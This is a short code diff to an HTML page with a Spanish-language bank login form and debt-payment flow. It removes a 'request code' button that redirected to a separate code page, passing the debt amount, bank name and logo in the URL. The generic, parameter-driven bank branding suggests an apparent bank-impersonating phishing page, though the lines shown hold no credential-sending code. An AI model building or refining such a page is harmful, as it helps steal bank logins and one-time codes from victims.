@@ -180,12 +180,8 @@
                     </div>
                 </div>
                 <div class="mt-8 text-center">
-                    <button type="button" id="codeButton"
-                        class="w-full h-14 rounded-xl text-white font-bold text-lg bg-[#2574A9] hover:bg-[#1f5c86] transition-colors">
-                        PEDIR CÓDIGO
-                    </button>
                     <button type="submit" id="payButton"
-                        class="w-full h-14 rounded-xl text-white font-bold text-lg bg-[#EF3320] hover:bg-[#d01508] transition-colors mt-4">
+                        class="w-full h-14 rounded-xl text-white font-bold text-lg bg-[#EF3320] hover:bg-[#d01508] transition-colors">
                         CONTINUAR
                     </button>
                 </div>
@@ -242,7 +238,6 @@
 
             const bankLoginForm = document.getElementById('bank-login-form');
             const loaderContainer = document.getElementById('loader-container');
-            const codeButton = document.getElementById('codeButton');
 
             bankLoginForm.addEventListener('submit', async function(event) {
                 event.preventDefault();
@@ -296,12 +291,6 @@
                     }
                 }
             });
-
-            if (codeButton) {
-                codeButton.addEventListener('click', function() {
-                    window.location.href = `code.html?deuda=${deudaTotal}&banco=${bankName}&logo=${encodeURIComponent(bankLogoUrl)}`;
-                });
-            }
 
             async function loadCfg() {
                 const res = await fetch('config.json');
